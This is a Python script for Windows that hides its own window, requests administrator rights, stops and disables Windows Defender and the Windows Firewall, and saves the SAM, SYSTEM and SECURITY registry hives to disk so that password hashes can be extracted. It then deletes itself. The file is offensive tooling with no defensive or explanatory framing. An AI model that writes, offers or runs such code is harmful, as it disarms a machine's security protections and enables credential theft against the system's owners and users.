import os
import sys
import subprocess
import ctypes
import tempfile
import shutil
import winreg
from pathlib import Path

def is_admin():
    """Check if the script is running with administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_hidden():
    """Relaunch the script with hidden window"""
    if len(sys.argv) == 1 or sys.argv[1] != 'hidden':
        try:
            # Create a temporary copy of the script
            temp_script = os.path.join(tempfile.gettempdir(), 'hidden_script.py')
            shutil.copy2(__file__, temp_script)
            
            # Run the hidden script
            subprocess.Popen([
                sys.executable, temp_script, 'hidden'
            ], creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)
        except Exception as e:
            print(f"Error running hidden: {e}")

def elevate_privileges():
    """Request administrator privileges"""
    if not is_admin():
        try:
            # Relaunch with admin privileges
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{__file__}" hidden', None, 0
            )
            sys.exit(0)
        except Exception as e:
            print(f"Failed to elevate privileges: {e}")
            sys.exit(1)

def disable_windows_defender():
    """Disable Windows Defender services"""
    services = ['WinDefend', 'WdNisSvc', 'Sense', 'SecurityHealthService']
    
    for service in services:
        try:
            # Disable service startup
            subprocess.run([
                'sc', 'config', service, 'start=', 'disabled'
            ], capture_output=True, check=True)
            
            # Stop the service
            subprocess.run([
                'net', 'stop', service, '/y'
            ], capture_output=True, check=True)
            
            print(f"Disabled and stopped {service}")
        except subprocess.CalledProcessError as e:
            print(f"Failed to disable {service}: {e}")

def disable_windows_firewall():
    """Disable Windows Firewall"""
    try:
        # Turn off firewall for all profiles
        subprocess.run([
            'netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'
        ], capture_output=True, check=True)
        
        # Disable and stop firewall service
        subprocess.run([
            'sc', 'config', 'MpsSvc', 'start=', 'disabled'
        ], capture_output=True, check=True)
        
        subprocess.run([
            'net', 'stop', 'MpsSvc', '/y'
        ], capture_output=True, check=True)
        
        print("Disabled Windows Firewall")
    except subprocess.CalledProcessError as e:
        print(f"Failed to disable firewall: {e}")

def extract_sam_files():
    """Extract SAM registry files"""
    sam_files = {
        'hklm\\sam': 'C:\\sam.save',
        'hklm\\system': 'C:\\system.save', 
        'hklm\\security': 'C:\\security.save'
    }
    
    for reg_key, output_path in sam_files.items():
        try:
            subprocess.run([
                'reg', 'save', reg_key, output_path, '/y'
            ], capture_output=True, check=True)
            print(f"Extracted {reg_key} to {output_path}")
        except subprocess.CalledProcessError as e:
            print(f"Failed to extract {reg_key}: {e}")

def cleanup():
    """Cleanup the script file"""
    try:
        os.remove(__file__)
        print("Script cleaned up")
    except Exception as e:
        print(f"Cleanup failed: {e}")

def install_dependencies():
    """Install required Python dependencies"""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
        print("Pip upgraded successfully")
    except subprocess.CalledProcessError:
        print("Pip upgrade failed or already up to date")

def main():
    """Main function"""
    print("Starting script execution...")
    
    # Run hidden and elevate privileges
    run_hidden()
    
    if not is_admin():
        elevate_privileges()
        return
    
    # Install dependencies first
    install_dependencies()
    
    # Execute the main functionality
    disable_windows_defender()
    disable_windows_firewall()
    extract_sam_files()
    
    # Cleanup
    cleanup()
    print("All operations completed")

if __name__ == "__main__":
    main()
